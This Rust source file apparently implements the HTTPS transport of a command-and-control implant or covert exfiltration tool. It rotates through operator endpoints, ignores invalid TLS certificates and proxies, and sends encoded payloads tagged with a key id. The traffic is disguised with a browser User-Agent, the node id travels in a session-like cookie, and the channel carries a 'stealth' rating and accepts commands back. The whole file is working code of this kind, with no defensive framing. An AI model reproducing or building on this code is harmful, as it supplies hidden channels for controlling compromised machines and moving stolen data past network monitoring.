use base64::Engine;
use base64::engine::general_purpose::URL_SAFE_NO_PAD as BASE64;

use super::{Channel, ChannelInfo, Latency, SendContext};

pub struct HTTPChannel {
    endpoints: Vec<String>,
    current: std::sync::atomic::AtomicUsize,
    client: reqwest::blocking::Client,
    info: ChannelInfo,
}

impl HTTPChannel {
    pub fn new(endpoints: Vec<String>) -> Result<Self, Box<dyn std::error::Error>> {
        let client = reqwest::blocking::Client::builder()
            .danger_accept_invalid_certs(true)
            .timeout(std::time::Duration::from_secs(30))
            .no_proxy()
            .build()?;

        Ok(HTTPChannel {
            endpoints,
            current: std::sync::atomic::AtomicUsize::new(0),
            client,
            info: ChannelInfo {
                name: "https",
                max_payload: 1 << 20,
                bidirectional: true,
                confirmed: true,
                stealth: 1,
                latency: Latency::Realtime,
            },
        })
    }

    fn next_endpoint(&self) -> &str {
        let idx = self.current.load(std::sync::atomic::Ordering::Relaxed);
        &self.endpoints[idx % self.endpoints.len()]
    }

    fn advance_endpoint(&self) {
        self.current.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
    }
}

impl Channel for HTTPChannel {

    fn info(&self) -> &ChannelInfo {
        &self.info
    }

    fn send(&self, ctx: &SendContext) -> Result<Option<Vec<u8>>, Box<dyn std::error::Error>> {
        let endpoint = self.next_endpoint();

        let key_id_hex = hex::encode(ctx.key_id);
        let payload_b64 = BASE64.encode(&ctx.payload);
        let body = format!("{}{}", key_id_hex, payload_b64);

        let resp = self
            .client
            .post(endpoint)
            .header("Content-Type", "application/x-www-form-urlencoded")
            .header(
                "User-Agent",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            )
            .header(
                "Cookie",
                format!("sid={}", ctx.node_id),
            )
            .body(body)
            .send();

        match resp {
            Ok(r) => {
                let bytes = r.bytes()?;
                if bytes.is_empty() {
                    Ok(None)
                } else {
                    Ok(Some(bytes.to_vec()))
                }
            }
            Err(e) => {
                self.advance_endpoint();
                Err(e.into())
            }
        }
    }
}